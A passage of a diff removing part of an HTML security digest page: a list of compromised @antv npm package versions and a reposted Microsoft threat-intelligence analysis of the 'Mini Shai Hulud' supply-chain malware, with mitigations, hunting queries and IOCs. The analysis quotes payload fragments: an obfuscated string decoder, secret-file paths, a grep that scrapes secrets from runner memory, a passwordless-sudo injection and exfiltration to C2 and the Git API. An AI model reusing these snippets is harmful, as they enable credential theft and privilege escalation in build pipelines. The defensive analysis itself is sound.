-@antv/f2-react | 5.15.0, 5.16.0 | AntV F2 Mobile |
-@antv/g | 6.4.1, 6.5.1 | AntV G Renderer |
-@antv/g-base | 0.6.16, 0.7.16 | AntV G Renderer |
-@antv/g-camera-api | 2.1.45, 2.2.45 | AntV G Renderer |
-@antv/g-canvas | 2.3.0, 2.4.0 | AntV G Renderer |
-@antv/g-device-api | 1.7.13, 1.8.13 | AntV G Renderer |
-@antv/g-dom-mutation-observer-api | 2.1.42, 2.2.42 | AntV G Renderer |
-@antv/g-gesture | 3.1.42, 3.2.42 | AntV G Renderer |
-@antv/g-lite | 2.8.0, 2.9.0 | AntV G Renderer |
-@antv/g-lottie-player | 1.2.1, 1.3.1 | AntV G Renderer |
-@antv/g-math | 3.2.0, 3.3.0 | AntV G Renderer |
-@antv/g-mobile-canvas | 1.2.1, 1.3.1 | AntV G Renderer |
-@antv/g-mobile-canvas-element | 1.1.42, 1.2.42 | AntV G Renderer |
-@antv/g-mobile-svg | 1.2.1, 1.3.1 | AntV G Renderer |
-@antv/g-mobile-webgl | 1.2.1, 1.3.1 | AntV G Renderer |
-@antv/g-plugin-3d | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-plugin-a11y | 1.5.1, 1.6.1 | AntV G Renderer |
-@antv/g-plugin-canvas-path-generator | 2.2.26, 2.3.26 | AntV G Renderer |
-@antv/g-plugin-canvas-picker | 2.4.1, 2.5.1 | AntV G Renderer |
-@antv/g-plugin-canvas-renderer | 2.6.1, 2.7.1 | AntV G Renderer |
-@antv/g-plugin-control | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-plugin-device-renderer | 2.7.1, 2.8.1 | AntV G Renderer |
-@antv/g-plugin-dom-interaction | 2.2.31, 2.3.31 | AntV G Renderer |
-@antv/g-plugin-dragndrop | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-plugin-html-renderer | 2.4.1, 2.5.1 | AntV G Renderer |
-@antv/g-plugin-image-loader | 2.4.1, 2.5.1 | AntV G Renderer |
-@antv/g-plugin-mobile-interaction | 1.1.42, 1.2.42 | AntV G Renderer |
-@antv/g-plugin-rough-canvas-renderer | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-plugin-rough-svg-renderer | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-plugin-svg-picker | 2.1.46, 2.2.46 | AntV G Renderer |
-@antv/g-plugin-svg-renderer | 2.5.1, 2.6.1 | AntV G Renderer |
-@antv/g-svg | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-web-animations-api | 2.2.32, 2.3.32 | AntV G Renderer |
-@antv/g-webgl | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-webgpu | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/g-webgpu-core | 0.8.2, 0.9.2 | AntV G Renderer |
-@antv/g-webgpu-engine | 0.8.2, 0.9.2 | AntV G Renderer |
-@antv/g2 | 5.5.8, 5.6.8 | AntV G2 Charting |
-@antv/g2-extension-3d | 0.3.0, 0.4.0 | AntV G2 Charting |
-@antv/g2-extension-ava | 0.3.0, 0.4.0 | AntV G2 Charting |
-@antv/g2-extension-plot | 0.3.2, 0.4.2 | AntV G2 Charting |
-@antv/g2-plugin-slider | 2.2.1, 2.3.1 | AntV G2 Charting |
-@antv/g2plot | 2.5.35, 2.6.35 | AntV G2 Charting |
-@antv/g6 | 5.2.1, 5.3.1 | AntV G6 Graph |
-@antv/g6-core | 0.9.24, 0.10.24 | AntV G6 Graph |
-@antv/g6-element | 0.9.25, 0.10.25 | AntV G6 Graph |
-@antv/g6-extension-react | 0.3.7, 0.4.7 | AntV G6 Graph |
-@antv/g6-pc | 0.9.25, 0.10.25 | AntV G6 Graph |
-@antv/g6-plugin | 0.9.25, 0.10.25 | AntV G6 Graph |
-@antv/g6-ssr | 0.2.1, 0.3.1 | AntV G6 Graph |
-@antv/geo-coord | 1.1.8, 1.2.8 | AntV L7 Mapping |
-@antv/gi-assets-basic | 2.5.40, 2.6.40 | AntV GraphInsight |
-@antv/gi-sdk | 3.1.0, 3.2.0 | AntV GraphInsight |
-@antv/gi-theme-antd | 0.7.11, 0.8.11 | AntV Graph Insight |
-@antv/gl-matrix | 2.8.1, 2.9.1 | AntV Core |
-@antv/gpt-vis | 1.1.0, 1.2.0 | AntV AI/LLM |
-@antv/gpt-vis-ssr | 0.4.7, 0.5.7 | AntV AI/LLM |
-@antv/graphin | 3.1.5, 3.2.5 | AntV G6 Graph |
-@antv/graphlib | 2.1.4, 2.2.4 | AntV Core |
-@antv/hierarchy | 0.8.1, 0.9.1 | AntV Core |
-@antv/infographic | 0.3.19, 0.4.19 | AntV AVA |
-@antv/l7 | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-component | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-core | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-draw | 3.2.5, 3.3.5 | AntV L7 Mapping |
-@antv/l7-layers | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-map | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-maps | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-react | 2.5.3, 2.6.3 | AntV L7 Mapping |
-@antv/l7-renderer | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-scene | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-source | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-three | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7-utils | 2.26.10, 2.27.10 | AntV L7 Mapping |
-@antv/l7plot | 0.6.11, 0.7.11 | AntV L7 Mapping |
-@antv/l7plot-component | 0.1.11, 0.2.11 | AntV L7 Mapping |
-@antv/larkmap | 1.6.1, 1.7.1 | AntV L7 Mapping |
-@antv/layout-gpu | 1.2.7, 1.3.7 | AntV Core |
-@antv/layout-wasm | 1.5.2, 1.6.2 | AntV Core |
-@antv/li-core-assets | 1.4.7, 1.5.7 | AntV LI |
-@antv/li-editor | 1.7.1, 1.8.1 | AntV LI |
-@antv/li-sdk | 1.6.1, 1.7.1 | AntV LI |
-@antv/matrix-util | 3.1.4, 3.2.4 | AntV Core |
-@antv/mcp-server-antv | 0.2.8, 0.3.8 | MCP Server |
-@antv/mcp-server-chart | 0.10.10, 0.11.10 | MCP Server |
-@antv/path-util | 3.1.1, 3.2.1 | AntV Core |
-@antv/react-g | 2.2.1, 2.3.1 | AntV G Renderer |
-@antv/s2 | 2.8.1, 2.9.1 | AntV S2 Spreadsheet |
-@antv/s2-react | 2.4.1, 2.5.1 | AntV S2 Spreadsheet |
-@antv/s2-ssr | 0.2.1, 0.3.1 | AntV S2 Spreadsheet |
-@antv/s2-vue | 2.3.0, 2.4.0 | AntV S2 Spreadsheet |
-@antv/scale | 0.6.2, 0.7.2 | AntV Core |
-@antv/smart-color | 0.3.1, 0.4.1 | AntV Core |
-@antv/thumbnails | 2.1.0, 2.2.0 | AntV Core |
-@antv/util | 3.4.11, 3.5.11 | AntV Core |
-@antv/vendor | 1.1.11, 1.2.11 | AntV Core |
-@antv/x6 | 3.2.7, 3.3.7 | AntV X6 Diagramming |
-@antv/x6-angular-shape | 3.1.1, 3.2.1 | AntV X6 Diagramming |
-@antv/x6-react-shape | 3.1.1, 3.2.1 | AntV X6 Diagramming |
-@antv/x6-vue-shape | 3.1.2, 3.2.2 | AntV X6 Diagramming |
-@antv/x6-vue3-shape | 1.1.0, 1.2.0 | AntV X6 Diagramming |
-@antv/xflow | 2.2.13, 2.3.13 | AntV X6 Diagramming |
-@lint-md/cli | 2.1.0, 2.2.0 | Linting |
-@lint-md/core | 2.1.0, 2.2.0 | Linting |
-@lint-md/parser | 0.1.14, 0.2.14 | Linting |</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-7" class="article-body">
-            <h2 class="article-title">Mini Shai Hulud: Compromised @antv npm packages enable CI/CD credential theft</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/05/20/mini-shai-hulud-compromised-antv-npm-packages-enable-ci-cd-credential-theft/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft has identified an active supply chain attack targeting the @antv node package manager (npm) package ecosystem. A threat actor compromised an @antv maintainer account and published malicious versions of widely used data-visualization packages, resulting in cascading downstream impact.
-The compromise propagated through dependency chains into libraries like echarts-for-react (which has more than 1 million weekly downloads), expanding the blast radius into CI/CD pipelines and cloud workloads across the ecosystem. The malicious payload—a ~499 KB obfuscated JavaScript file—runs silently during npm install and is purpose-built to steal credentials from GitHub Actions environments.
-Key capabilities observed in the payload include multi-platform credential theft (GitHub, Amazon Web Services, HashiCorp Vault, npm, Kubernetes, 1Password), GitHub Action Runner process memory scraping, privilege escalation, dual-channel data exfiltration, and Supply chain Levels for Software Artifacts (SLSA) provenance forgery. These capabilities suggest a deliberate effort to evade analysis and an apparent focus on CI/CD environments.
-The authors of the antv account have also since confirmed in a ticket on the repo that the situation is now resolved.
-Attack chain overview
-The @antv organization maintains charting libraries (G2, G6) embedded across dashboards and applications. The attack proceeds through:
-- Maintainer account compromise and publication of malicious @antv package versions
-- Downstream dependency amplification (echarts-for-react, size-sensor, and others)
-- Automatic payload execution through a preinstall hook during npm install
-- Execution chain: node → shell → bun → payload (Bun runtime installed if absent)
-Technical analysis
-The payload replaces the legitimate index.js with a single-line obfuscated script.
-Obfuscation
-- Layer 1: 1,732 Base64-encoded strings in a rotated array, decoded through lookup function with the shuffle key 0xa31de
-- Layer 2: Critical strings such as command-and-control (C2) domain and env var names are encrypted with a custom PBKDF2 and SHA-256 cipher, which is decrypted at runtime.
-- Environment gating: The payload exits immediately if it’s not running on GitHub Actions on Linux
-- Branch avoidance: Skips the main, master, dependabot/, renovate/, and gh-pages when using Git API exfiltration
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 | // Layer 1: 1,732 strings in rotated array with base64 decode (function(_0x44be0e, _0x3ff020){ // Array shuffle IIFE with key 0xa31de _0x335af4['push'](_0x335af4['shift']()); })(_0x71ec, 0xa31de)); // Layer 2: PBKDF2+SHA256 runtime decryption for critical strings var e6 = "a8269c01069452afb8a54de904e6419578d155fdbdb9e566bab8576a4266b61e"; var t6 = "7f44e4ba6f6a71bd0f789e7f83bd3104"; var u5 = new du(e6, t6); // PBKDF2 cipher instance globalThis["f2959c600"] = function(s) { return u5.decode(s); }; // Environment gate - exits if not GitHub Actions on Linux this['isGitHubActions'] = process.env[f2959c600('68zz23c6NGR9...')] === 'true'; this['isLinuxRunner'] = process.env[f2959c600('NhUrwwYEwYIJ...')] === 'Linux'; |
-Credential theft
-The payload targets secrets across six platforms:
-- GitHub: Extracts GITHUB_TOKEN, scans for Personal Access Tokens (gh[op]_) and installation tokens (ghs_), validates through /user API, and enumerates repo and org secrets.
-- Amazon Web Services(AWS): Queries Instance Metadata Service (169.254.169[.]254), Elastic Container Service metadata (169.254.170[.]2), reads .aws/ files, harvests env vars, and then calls SecretsManager across all regions.
-- HashiCorp Vault: Searches 12+ token paths (/var/run/secrets/vault/token, ~/.vault-token, and others) and connects to a local Vault at 127.0.0[.]1:8200.
-- npm: Validates tokens using /-/whoami, exchanges OpenID Connect (OIDC) tokens for publish access, and enumerates packages
-- Kubernetes: Reads service account tokens and enumerates namespace secrets
-- 1Password: Interacts with command-line interface (CLI) and attempts master password extraction with two-factor authentication (2FA) bypass
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 | // AWS Secrets Manager enumeration 'secretsmanager:ListSecrets' 'secretsmanager:GetSecretValue(' // Vault token paths searched (12+ locations) '/var/run/secrets/vault/token' '/.vault-token' '/home/runner/.vault-token' '/root/.vault-token' '/etc/vault/token' // GitHub API secret enumeration '/actions/secrets?per_page=100' '/actions/organization-secrets?per_page=100' |
-Runner memory scraping
-The payload locates the GitHub Actions Runner.Worker PID using /proc scanning, then extracts runtime secrets using the following:
-1 2 3 4 5 6 7 | // Locates Runner.Worker PID via /proc 'findRunnerWorkerPIDLinux' // Scans /proc/<pid>/cmdline for "Runner.Worker" // Extracts secrets from process memory tr -d '\0' | grep -aoE '"[^"]+":{"value":"[^"]*","isSecret":true}' | sort -u </pid> |
-This activity bypasses normal secret masking by reading secrets directly from runner process memory.
-Privilege escalation
-- Injects sudoers rule through bind mount: echo ‘runner ALL=(ALL) NOPASSWD:ALL’ > /mnt/runner
-- Modifies /etc/hosts for DNS redirection
-1 2 3 4 5 6 7 8 9 10 | // Injects passwordless sudo via /etc/sudoers.d bind mount at /mnt echo 'runner ALL=(ALL) NOPASSWD:ALL' > && chmod 0440 /mnt/runner // DNS manipulation sudo sh -c "echo '127.0.0.1 <target>' >> /etc/hosts" // Validates sudo access before operations sudo -n true </target> |
-Exfiltration
-Dual-channel exfiltration:
-- Primary: HTTPS to encrypted C2 domain (port 443) with DNS pre-check and health probe
-- Fallback: Git Data API — Creates blobs, trees, or commits in victim repositories on non-protected branches
-- Tertiary: Creates public repos under victim accounts with reversed description (“niagA oG eW ereH :duluH-iahS”); more than 2,200 of these repos have been observed as of this writing
-1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 | // Primary: HTTPS C2 with encrypted domain (port 443) let config = { 'domain': f2959c600('bXVunP4+izfR/cOx8zhW/fw8v6xFc4cvjYgGdbEE'), 'port': 0x1bb, // 443 'path': f2959c600('5WA4NOQUD/n/mNx/cqL4gSVQrTrwV+RBKO7TXeTIk3fFBUt+2arGDjc='), 'dry_run': false }; // Fallback: Git Data API - creates blobs/trees/commits in victim repos await j(token, '/repos/' + owner + '/' + repo + '/git/blobs', {'method': 'POST', 'body': JSON.stringify(stolen_data)}); '/git/trees' '/git/commits' // Branch filter - avoids protected branches to evade detection Dw = ['dependabot/', 'renovate/', 'gh-pages', 'docs/', 'copilot/', 'master', 'main']; |
-Propagation and persistence
-- Enumerates /user/repos and /user/orgs to spread into additional repositories
-- Installs Bun runtime, executes second-stage payload using bun run .claude/
-- Deploys token monitor for ongoing credential capture
-- Forges SLSA provenance attestations through Sigstore (Fulcio or Rekor) to appear legitimate
-Impact and blast radius
-- Direct compromise of @antv packages with broad ecosystem adoption
-- Amplification through downstream dependencies into thousands of projects
-- Cascading risk: stolen npm tokens enable further package poisoning, stolen GitHub tokens enable repo manipulation, and stolen AWS credentials enable cloud access
-- SLSA provenance forgery erodes trust in supply chain attestation frameworks
-How GitHub took action to prevent further harm
-Upon learning of the attack, GitHub acted immediately to limit further damage. It removed 640 malicious packages and invalidated 61,274 npm granular access tokens with write permissions and 2FA bypass, preventing leaked tokens from being used in this or similar attacks. GitHub also [published advisories](https://github.com/advisories?query=type%3Amalware) relevant to this malware campaign in the GitHub Advisory Database and alerted the community through Dependabot alerts and npm audit. It continues to monitor for additional affected packages and remove them as needed.
-Mitigation and protection guidance
-Microsoft recommends the following mitigations to reduce the impact of this threat:
-- Review dependency trees for direct or transitive usage of affected @antv/ packages.
-- Identify systems that installed or built affected package versions during the suspected exposure window.
-- Pin known-good package versions where possible and avoid automatic dependency upgrades until validation is complete.
-- Disable pre- and post-installation script execution by ensuring you run npm install with
---ignore-scripts
-. - While GitHub team has already invalidated all the npm tokens that had write access and 2FA bypass, Microsoft Defender still recommends rotating credentials, tokens, npm access tokens, CI/CD secrets, and cloud credentials that might have been exposed in affected build or developer environments.
-- Rotate credentials, tokens, npm access tokens, CI/CD secrets, and cloud credentials that might have been exposed in affected build or developer environments.
-- Audit organization and personal GitHub accounts for public repositories with the description “niagA oG eW ereH :duluH-iahS” or other unexpected repositories created during the exposure window, and revoke any GitHub tokens that might have been implicated.
-- Audit CI/CD logs for unexpected outbound network connections, script execution, or suspicious package lifecycle activity.
-- Review npm package lockfiles, build logs, and artifact provenance for evidence of compromised package versions.
-[Enable cloud-delivered protection](https://learn.microsoft.com/en-us/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus)in Microsoft Defender Antivirus or equivalent antivirus protection.- Use Microsoft Defender XDR to investigate suspicious activity across endpoints, identities, cloud apps, and developer environments.
-- Use Microsoft Defender Vulnerability Management to search for antv packages across your estate.
-Microsoft Defender XDR Detections
-Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
-Customers with provisioned access can also use Microsoft Security Copilot in Microsoft Defender to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
-| Tactic | Observed activity | Microsoft Defender coverage |
-| Execution | Suspicious script execution during npm install or package lifecycle activity | Microsoft Defender Antivirus – Trojan:AIGen/NPMStealer – Backdoor:Python/ShaiWorm – Trojan:JS/ShaiWorm – Trojan:JS/ObfusNpmJs Microsoft Defender for Endpoint – Suspicious usage of Bun runtime – Suspicious Installation of Bun runtime – Suspicious Node.js process behavior Microsoft Defender XDR Suspicious file creation in temporary directory by Bun.exe binary Suspicious Bun execution from Node.js process |
-| Credential Access | Potential harvesting of environment variables, tokens, or developer secrets | Microsoft Defender for Endpoint – Credential access attempt – Suspicious cloud credential access by npm-cached binary – Kubernetes secrets enumeration indicative of credential access Microsoft Defender for Cloud Sha1-Hulud Campaign Detected: Possible command injection to exfiltrate credentials |
-| Command and Control | Potential outbound connections from build systems or developer machines | Microsoft Defender for Endpoint Connection to a custom network indicator |
-Microsoft Security Copilot
-Security Copilot customers can use the standalone experience to create their own prompts or run prebuilt promptbooks to automate incident response or investigation tasks related to this threat, including:
-- Incident investigation
-- Microsoft user analysis
-- Threat Intelligence 360 report based on MDTI article
-- Vulnerability or supply chain impact assessment
-Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.
-Microsoft Defender XDR Threat analytics
-https://security.microsoft.com/threatanalytics3/5879a0e7-f145-407b-bc84-1ae405a016ea/overview
-Advanced hunting
-The following sample queries let you search for a week’s worth of events. To explore up to 30 days of raw data, go to the Advanced Hunting page > Query tab, and update the time range to Last 30 days.
-Hunt for suspicious npm lifecycle script execution
-This query searches for Node.js and npm activity involving install lifecycle behavior and relevant package references.
-1 2 3 4 5 6 7 | DeviceProcessEvents | where FileName in~ ("node.exe", "npm.cmd", "npm.exe", "npx.cmd", "npx.exe") | where ProcessCommandLine has_any ("preinstall", "postinstall", "install") | where ProcessCommandLine has_any ("@antv", "echarts-for-react") | project Timestamp, DeviceName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName |
-Hunt for potential compromise of through malicious npm packages
-1 2 3 4 | DeviceProcessEvents | where Timestamp > ago(2d) | where FileName in ("bun", "bun.exe") | where ProcessCommandLine has "run index.js" |
-Hunt for affected dependencies in your software inventory
-1 2 3 | DeviceTvmSoftwareInventory | where SoftwareName has "antv" or SoftwareVendor has "antv" | project DeviceName, OSPlatform, SoftwareVendor, SoftwareName, SoftwareVersion |
-Hunt for suspicious outbound connection from python backdoor
-1 2 3 4 | DeviceNetworkEvents | where Timestamp > ago(2d) | where InitiatingProcessFileName startswith "python" | where InitiatingProcessCommandLine has "/cat.py" |
-Hunt for suspicious outbound activity from Node.js processes
-Searches for network connections initiated by Node.js or npm processes that reference package-related paths or commands.
-1 2 3 4 5 6 | DeviceNetworkEvents | where InitiatingProcessFileName in~ ("node.exe", "npm.exe", "npx.exe") | where InitiatingProcessCommandLine has_any ("@antv", "echarts-for-react", "node_modules") | project Timestamp, DeviceName, RemoteUrl, RemoteIP, InitiatingProcessFileName, InitiatingProcessCommandLine, AccountName |
-Hunt for affected dependency references in developer directories
-This query searches for package manifest or lockfile activity that might contain relevant dependency references.
-1 2 3 4 5 6 | DeviceFileEvents | where FileName in~ ("package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml") | where FolderPath has_any ("node_modules", "src", "repo", "workspace") | where AdditionalFields has_any ("@antv", "echarts-for-react") | project Timestamp, DeviceName, FolderPath, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine |
-Hunt for post-compromise C2 activity
-1 2 3 | DeviceNetworkEvents | where Timestamp > ago(2d) | where RemoteUrl has "t.m-kosche.com" |
-Shai-Hulud npm supply-chain indicator observed inside a Kubernetes container
-1 2 3 | CloudProcessEvents | where ProcessCommandLine has_any ("IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner", "niagA oG eW ereH", ":duluH-iahS", "t.m-kosche.com", "7cb42f57561c321ecb09b4552802ae0ac55b3a7a", "@antv/setup") | project Timestamp, AzureResourceId, KubernetesPodName, KubernetesNamespace, ContainerName, ContainerId, ContainerImageName, ProcessName, ProcessCommandLine, ProcessCurrentWorkingDirectory, ParentProcessName, ProcessId, ParentProcessId, AccountName |
-Indicators of Compromise (IOC)
-| Indicator | Type | Description |
-| @antv – whole account | Package scope | All packages maintained by the antv account were compromised. As per the latest statement from the account author’s this situation is now resolved. |
-| echarts-for-react | Package name | One of the major downstream packages impacted by the antv compromise. As per the latest statement from the repository author’s this situation is now resolved |
-| a68dd1e6a6e35ec3771e1f94fe796f55dfe65a2b94560516ff4ac189390dfa1c | SHA-256 | Malicious payload JavaScript file |
-| fb5c97557230a27460fdab01fafcfabeaa49590bafd5b6ef30501aa9e0a51142 | SHA-256 | Malicious backdoor Python script |
-| t.m-kosche[.]com:443 | Domain | Infrastructure associated with campaign |
-| Index.js | File name | Malicious script or dropped file |
-| cat.py | File name | Malicious script or dropped file |
-References
-This research is provided by Microsoft Defender Security Research with contributions from Rahul Mohandas, Sumith Maniath, Ahmed Saleem Kasmani, Arvind Gowda, Sagar Patil, and members of Microsoft Threat Intelligence.
-Learn more
-For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
-To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
-To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
-Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
-[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
-[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
-[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
-[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime) - Explore
-[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
